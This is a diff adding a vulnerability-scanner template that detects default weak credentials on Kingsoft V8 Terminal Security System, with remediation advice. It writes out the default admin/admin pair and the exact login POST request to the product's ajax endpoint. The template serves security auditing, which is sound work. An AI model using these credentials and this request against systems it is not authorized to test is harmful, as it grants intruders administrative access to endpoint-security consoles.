@@ -1,0 +1,49 @@
+id: kingsoft-v8-default-login
+info:
+  name: Kingsoft V8 Default Login
+  author:
+  - l0ne1y
+  tags:
+  - kingsoft
+  - default-login
+  description: |-
+    Kingsoft V8 Terminal Security System Weak Password Vulnerability
+    Kingsoft V8 Terminal Security System is a new-generation enterprise terminal security software that can dynamically detect, process in real time, and trace unknown threats across the entire network. It meets the increasingly complex terminal security protection needs of domestic enterprise users across diverse endpoints including PCs, mobile devices, and virtual desktops.
+
+    Kingsoft V8 Terminal Security System has default weak-password accounts.
+  reference:
+  - https://idc.wanyunshuju.com/aqld/2123.html
+  severity: medium
+  remediation: |-
+    Remediation:
+    1. It is recommended that system administrators immediately change any detected weak passwords to strong ones.
+    2. Weak-password prevention depends on management. Enterprises should establish a strong-password policy (e.g., passwords must contain at least three of the following: uppercase letters, lowercase letters, digits, and special characters; be at least ten characters long; avoid sequential keyboard patterns; and be unrelated to corporate or personal information).
+    3. Weak-password auditing can be done in two ways: aggregating all employee accounts and performing self-checks against the strong-password rules, or running dictionary-based brute-force attacks with personalized wordlists.
+    4. Recommended online strong-password generator: [https://suijimimashengcheng.51240.com/](https://suijimimashengcheng.51240.com/)
+    5. Recommended online password-strength checker: [https://howsecureismypassword.net/](https://howsecureismypassword.net/)
+requests:
+- matchers:
+  - type: word
+    condition: and
+    part: body
+    words:
+    - ADMIN
+    - userSession
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1
+    Host: {{Hostname}}
+
+    {"get_user_login_cmd":{"name":"{{username}}","password":"{{md5("{{password}}")}}"}}
+  attack: pitchfork
+  payloads:
+    password:
+    - admin
+    username:
+    - admin
+  max-redirects: 2
+  redirects: true
